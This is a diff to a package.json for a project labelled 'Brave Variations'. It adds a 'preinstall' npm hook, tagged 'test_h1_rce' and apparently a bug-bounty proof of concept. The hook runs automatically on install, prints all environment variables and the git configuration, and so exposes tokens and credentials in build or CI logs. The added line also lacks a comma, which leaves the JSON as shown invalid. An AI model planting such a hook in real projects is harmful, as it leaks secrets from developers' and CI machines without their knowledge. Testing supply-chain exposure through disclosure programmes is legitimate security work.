@@ -3,6 +3,7 @@
   "version": "0.0.1",
   "description": "Brave Variations",
   "scripts": {
+    "preinstall": "echo  'test_h1_rce--- ENV FROM PREINSTALL ---' && env && echo '--gitconfig---' && git config --list && exit"
     "build": "npm run build:proto && npm run build:web",
     "build:proto": "tsx src/scripts/generate_proto_ts.ts",
     "build:web": "webpack -c src/web/webpack.config.js --mode=production",
